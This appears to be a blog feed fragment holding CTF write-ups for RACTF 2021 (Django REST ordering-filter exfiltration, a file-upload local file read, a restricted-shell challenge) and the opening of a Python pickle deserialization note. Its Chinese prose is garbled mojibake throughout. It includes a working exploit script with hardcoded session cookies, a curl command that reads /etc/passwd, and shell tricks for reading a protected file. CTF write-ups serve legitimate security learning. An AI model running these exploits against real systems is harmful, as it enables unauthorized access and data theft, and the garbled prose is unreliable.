&lt;p>models.pyè§„å®šäº†æ•°æ®åº“çš„å­˜å‚¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png" alt="image-20210818133525714">&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªé…å¥—çš„model serializerï¼Œè§„å®šäº†åªè¯»å’Œåªå†™çš„ä¸åŒå†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png" alt="image-20210818133658766">&lt;/p>
&lt;p>ç„¶åæ˜¯views.pyï¼Œå½“ç¡®è®¤userç™»å½•çŠ¶æ€ä¹‹åï¼Œå¦‚æœè®¾ç½®è¿‡secretå°†ä¼šå±•ç¤ºå‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png" alt="image-20210818134115205">&lt;/p>
&lt;p>ç›´æ¥ç”¨Getæ–¹å¼è¯·æ±‚&lt;code>/api/secret/?format=json&lt;/code>å¯ä»¥å¾—åˆ°æ‰€æœ‰è®¾ç½®è¿‡çš„secretï¼Œç†æ‰€å½“ç„¶çš„çŒœæµ‹id=1,owner=1çš„value=flagï¼Œä½†æ˜¯valueå­—æ®µæ˜¯åªå†™è€Œéåªè¯»çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png" alt="image-20210818151539994">&lt;/p>
&lt;p>ç”±äºç”¨çš„æ˜¯djangoçš„rest frameworkï¼Œå¯ä»¥åˆ©ç”¨å®ƒçš„&lt;a href="https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter">Ordering Filter&lt;/a>åŠŸèƒ½æ¥å¯¹è¿™äº›jsonå†…å®¹æ ¹æ®valueæ¥è¿›è¡Œä¸€ä¸ªæ’åº&lt;code>/api/secret/?ordering=value&amp;amp;format=json&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png" alt="image-20210818152408227">&lt;/p>
&lt;p>é‡‡ç”¨char-by-charçš„ç›²æ³¨æ–¹å¼ï¼Œä¸æ–­åœ°é‡å¤è®¾ç½®secret-&amp;gt;ä»¥valueæ’åº-&amp;gt;å¦‚æœä½äºid=1,owner=1çš„å‰é¢ï¼Œå¹¶ä¸”ä¸‹ä¸€æ¬¡å°±ä½äºå®ƒçš„åé¢ï¼Œè¯´æ˜è¿™æ˜¯æ­£ç¡®çš„å­—ç¬¦-&amp;gt;ä¿®æ”¹secretï¼Œç»§ç»­çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;span style="color:#111">csrf_token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu&amp;#34;&lt;/span>
&lt;span style="color:#111">session_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq&amp;#34;&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;csrftoken=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">csrf_token&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; sessionid=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session_id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;X-CSRFToken&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">csrf_token&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">our_secret_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curr_flag&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curr_flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">json_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">json_payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(r.status_code)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/?ordering=value&amp;amp;format=json&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secrets&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">secrets&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">our_secret_id&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">found_real_char&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">next_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">next_char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] Curr Flag:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{data_exf1l_via_s0rt1ng_0c66de47}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store">wp1&lt;/a> &lt;a href="https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5">wp2&lt;/a>&lt;/p>
&lt;h2 id="webim-a-fun">Web/I&amp;rsquo;m a fun&lt;/h2>
&lt;blockquote>
&lt;p>Agent,&lt;/p>
&lt;p>Do you remember the firearms store case from last year? The one they were using as a secret communication platform?&lt;/p>
&lt;p>Well, we&amp;rsquo;ve located the servers for them, the issue is they&amp;rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we&amp;rsquo;ll need to gain shell access to their systems the good old way. They&amp;rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they&amp;rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.&lt;/p>
&lt;p>We&amp;rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?&lt;/p>
&lt;/blockquote>
&lt;p>åœ¨/upload/contentå¤„å¯ä»¥ä¸Šä¼ videoï¼Œç‰¹åˆ«çš„æ˜¯ä¸Šä¼ å¤„æœ‰ä¸ª&lt;code>external&lt;/code>&lt;/p>
&lt;p>ç”¨curlæ–¹å¼è¯·æ±‚ä¸€ä¸‹/etc/passwdï¼Œ&lt;code>curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png" alt="image-20210818163712187">&lt;/p>
&lt;p>ä¹‹åå°è¯•è¯»æºç ï¼ˆæˆ‘æ²¡çˆ†å‡ºæ¥ç›®å½•ï¼‰ï¼Œä¹‹åçš„çœ‹wpäº†ï¼Œæˆ‘å¤ªèœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png" alt="image-20210818170117432">&lt;/p>
&lt;p>&lt;code>ractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md">wp&lt;/a>&lt;/p>
&lt;h2 id="osinttriangles">OSINT/Triangles&lt;/h2>
&lt;p>&lt;a href="https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW">https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png" alt="image-20210815120938702">&lt;/p>
&lt;h2 id="miscellaneousdiscord">Miscellaneous/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Come join our &lt;a href="https://discord.gg/Rrhdvzn">Discord&lt;/a>!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ractf{so_here_we_are_again}&lt;/code>&lt;/p>
&lt;h2 id="miscellaneousmissing-tools">Miscellaneous/Missing Tools&lt;/h2>
&lt;blockquote>
&lt;p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?&lt;/p>
&lt;p>Username: &lt;code>ractf&lt;/code>&lt;/p>
&lt;p>Password: &lt;code>8POlNixzDSThy&lt;/code>&lt;/p>
&lt;p>Note: it may take a minute or more for your container to start depending on load&lt;/p>
&lt;/blockquote>
&lt;p>æ ¹æ®ç»™å‡ºçš„ä¿¡æ¯sshè¿å…¥ä¸€ä¸ªç»ˆç«¯ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šçš„å‘½ä»¤éƒ½è¢«ç¦æ­¢äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png" alt="image-20210818025059013">&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>echo /usr/bin/* /bin/*&lt;/code>å¯ä»¥æŸ¥çœ‹èƒ½ä½¿ç”¨çš„å‘½ä»¤è¿˜æœ‰å“ªäº›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png" alt="image-20210818025158619">&lt;/p>
&lt;p>â€”â€”â€”â€”å…ˆè¯´ä¸€ä¸‹ç®€å•çš„éé¢„æœŸè§£ï¼š&lt;code>echo *&lt;/code>æ‰¾åˆ°flag.txtï¼Œç„¶å&lt;code>source flag.txt&lt;/code>æˆ–è€…&lt;code>sh &amp;lt; flag.txt&lt;/code>éƒ½èƒ½è¯»å‡ºæ¥&lt;/p>
&lt;p>è€Œé¢„æœŸè§£ä½¿ç”¨çš„æ˜¯&lt;u>split+re-sha256&lt;/u>çš„æ–¹å¼ã€‚ç›´æ¥ç”¨sha256sumå¾—åˆ°flagç„¶åæƒ³å¼ºè¡Œæš´åŠ›ç ´è§£æ˜¾ç„¶éå¸¸çš„ä¸ç°å®ï¼Œä½†æ˜¯splitè¿™ä¸ªå·¥å…·å¯ä»¥ä»¥å›ºå®šçš„å­—èŠ‚æ•°æ¥åˆ’åˆ†ç»™å®šçš„æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬ä»¥å¾ˆå°çš„æ ‡å°ºæ¥åˆ’åˆ†flagå¹¶è¿›è¡Œsha256ï¼Œé‚£ä¹ˆè¿™æ ·å¾—åˆ°çš„hashå€¼å°±å°†éå¸¸æœ‰å¯èƒ½çˆ†ç ´å‡ºæ¥ï¼Œæœ€åå†æŠŠå®ƒä»¬åˆèµ·æ¥å°±èƒ½å¾—åˆ°æœ€ç»ˆçš„flagäº†ï¼ˆè¿™é‡Œç”¨3bytesåˆ’åˆ†ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b &lt;span style="color:#ae81ff">3&lt;/span> flag.txt
$ &lt;span style="color:#111">echo&lt;/span> *
flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
$ sha256sum xa*
df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa
582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab
a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac
569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad
7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae
618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf
f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag
f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah
de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai
a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj
56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak
df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png" alt="image-20210818030044169">&lt;/p>
&lt;p>åˆ°&lt;a href="https://crackstation.net/">CrackStation&lt;/a>ä¸€æŠŠæ¢­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png" alt="image-20210818030225147">&lt;/p>
&lt;p>&lt;code>ractf{std0ut_1s_0v3rr4ted_spl1t_sha}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å®³ï¼Œå‰å‡ å¤©çŠ¶æ€è«åå¾ˆå·®ï¼Œä¹‹å‰æŠ¥çš„å‡ ä¸ªå‘¨æœ«çš„ctfç”šè‡³è¿ç­¾åˆ°éƒ½æ²¡ç­¾ï¼Œå¤ç°ä¹Ÿæ˜¯ä¸€æ‹–å†æ‹–ï¼Œæ‹–åˆ°ç¯å¢ƒéƒ½å…³å®Œäº†ï¼ŒæŒºåæ‚”çš„ï¼Œæ˜¯è‡ªå·±çš„é—®é¢˜ã€‚&lt;/p>
&lt;p>åœ¨åæ€å’Œè°ƒæ•´äº†ï¼Œå—¯ã€‚&lt;/p></description></item><item><title>ååºåˆ—åŒ–ä¸“é¢˜ç¬”è®°Â·å£¹Â·pythonç¯‡</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="åºåˆ—åŒ–ååºåˆ—åŒ–">åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–&lt;/h2>
&lt;p>åœ¨pythonä¸­æœ‰å¥½å‡ ä¸ªå†…ç½®æ¨¡å—éƒ½å¯ä»¥å¹²åºåˆ—åŒ–&amp;amp;ååºåˆ—åŒ–è¿™ä¸ªäº‹ï¼Œæ¯”å¦‚&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>ï¼Œè€Œæœ¬æ–‡åé¢æ¶‰åŠåˆ°çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œè‹¥æ— ç‰¹æ®Šè¯´æ˜ï¼ŒæŒ‡çš„éƒ½æ˜¯pickleã€‚&lt;/p>
&lt;p>pickleåçš„å¯¹è±¡ä»¥äºŒè¿›åˆ¶å­—èŠ‚æµå­˜å‚¨ï¼Œèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œæ¯”å¦‚&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> ã€ &lt;code>True&lt;/code> å’Œ &lt;code>False&lt;/code>&lt;/li>
&lt;li>æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¤æ•°&lt;/li>
&lt;li>strã€byteã€bytearray&lt;/li>
&lt;li>åªåŒ…å«å¯å°å­˜å¯¹è±¡çš„é›†åˆï¼ŒåŒ…æ‹¬ tupleã€listã€set å’Œ dict&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å‡½æ•°ï¼ˆä½¿ç”¨ def å®šä¹‰ï¼Œlambda å‡½æ•°åˆ™ä¸å¯ä»¥ï¼‰&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„å†…ç½®å‡½æ•°&lt;/li>
&lt;li>å®šä¹‰åœ¨æ¨¡å—æœ€å¤–å±‚çš„ç±»&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> å±æ€§å€¼æˆ– &lt;code>__getstate__()&lt;/code> å‡½æ•°çš„è¿”å›å€¼å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ï¼ˆè¯¦è§å®˜æ–¹æ–‡æ¡£çš„Pickling Class Instancesï¼‰&lt;/li>
&lt;/ul>
&lt;p>å½“ç„¶ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥ã€‚&lt;/p>
&lt;p>å¯¹äºä¸€ä¸ªObjectï¼Œå¯ä»¥é€šè¿‡é‡å†™&lt;code>object.__reduce__()&lt;/code>å‡½æ•°ï¼Œä½¿å…¶è¢«åºåˆ—åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œï¼›æ­¤å‡½æ•°ä¼šè¿”å›ä¸€ä¸ª&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>çš„å…ƒç»„ï¼Œæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«unpickleæ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ä»¥ç”Ÿæˆå¯¹è±¡ï¼ˆè¯¥callableå…¶å®æ˜¯æ„é€ å‡½æ•°ï¼‰ã€‚&lt;/p>
&lt;p>pickleçš„å¸¸ç”¨æ–¹æ³•æœ‰dumps(), loads()å’Œdump(), load()ï¼Œä¸å¸¦sçš„éœ€è¦çš„å‚æ•°æ˜¯æ–‡ä»¶å¥æŸ„ï¼Œè€Œå¸¦sçš„æ‰€éœ€è¦çš„å‚æ•°æ˜¯å­—ç¬¦ä¸²ã€‚&lt;/p>
&lt;p>è¯´åˆ°pickleä¸å¾—ä¸è°ˆçš„æ˜¯opcodeï¼Œå³&lt;u>PVM(python virtual machine)&lt;/u>çš„æ“ä½œç ï¼Œå®ƒå¯ä»¥è¢«PVMçš„è§£æå¼•æ“è§£é‡Šå¤„ç†ã€‚ç›®å‰opcodeæœ‰å¤šä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼ˆä½†å‘ä¸‹å…¼å®¹ï¼‰ï¼Œå…¶ä¸­py2å’Œpy3åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸åŒçš„ï¼Œå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶æŒ‡å®šåè®®ç‰ˆæœ¬ã€‚&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;2&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;ver_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># python3è¾“å‡º protocol&amp;lt;=5&lt;/span>
&lt;span style="color:#111">ver_0&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;(dp0&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">V1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I1&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">sV2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">p2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">I2&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">s.&amp;#39;&lt;/span>
&lt;span style="color:#111">ver_1&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;}q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">1q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">2q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">u.&amp;#39;&lt;/span>
